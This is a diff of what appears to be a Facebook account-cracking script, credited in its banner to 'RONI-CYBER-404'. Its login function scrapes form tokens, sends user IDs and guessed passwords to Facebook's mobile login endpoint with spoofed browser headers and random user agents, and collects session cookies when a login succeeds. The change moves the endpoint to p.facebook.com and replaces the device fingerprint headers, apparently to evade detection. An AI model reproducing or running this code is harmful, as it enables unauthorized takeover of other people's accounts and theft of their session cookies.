@@ -166,7 +166,7 @@ logo=("""
 \033[1;36m╚╝─╚═╩══╩╝─╚╩╝─╚╩╝─╚═╝──╚═══╩═╝╚═╝
 
 \x1b[38;5;46m===============================================   
- \x1b[1;36m{+} \x1b[1;91mTOOL CREATED BY   \x1b[1;97m: RONI AHAMED
+\x1b[1;36m{+} \x1b[1;91mTOOL CREATED BY   \x1b[1;97m: RONI AHAMED
 \x1b[1;36m{+} \x1b[1;92mGITHUB NAME       \x1b[1;97m: \x1b[1;94mRONI-CYBER-404
 \x1b[1;36m{+} \x1b[1;93mTOOL / \x1b[1;92mSTATUS    \x1b[1;97m : \x1b[1;93mRANDOM / \x1b[1;92mACTIVE
 \x1b[1;36m{+} \x1b[1;90mTOOL VIRSION      \x1b[1;97m: \x1b[1;90m1.0.0
@@ -298,7 +298,7 @@ def b(uid,pwx,tl):
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
-            free_fb = session.get('https://m.facebook.com').text
+            free_fb = session.get('https://p.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -310,26 +310,27 @@ def b(uid,pwx,tl):
             "pass":ps,
             "login":"Log In"}
             header_freefb = {'authority': 'p.facebook.com',
-    'method': 'GET', 
-	'scheme': 'https', 
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9',
-    'cache-control': 'max-age=0',
-    'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.61"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"Infinix X665B"',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"11.0.0"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': pro,
-    'viewport-width': '980',}
-            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            'method': 'GET', 
+	        'scheme': 'https', 
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'dpr': '1.2000000476837158',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-model': '"RMX2195"',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"11.0.0"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': pro,
+            'viewport-width': '980',}
+            lo = session.post('https://p.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -355,7 +356,7 @@ def superuser():
         Main()
     else:
         os.system("clear")
-        os.system("xdg-open https://www.facebook.com/profile.php?id=100055821998949&mibextid=ZbWKwL")
+        os.system("xdg-open https://www.facebook.com/profile.php?id=100055821998949/")
         time.sleep(3.0)
         
         os.system("clear")
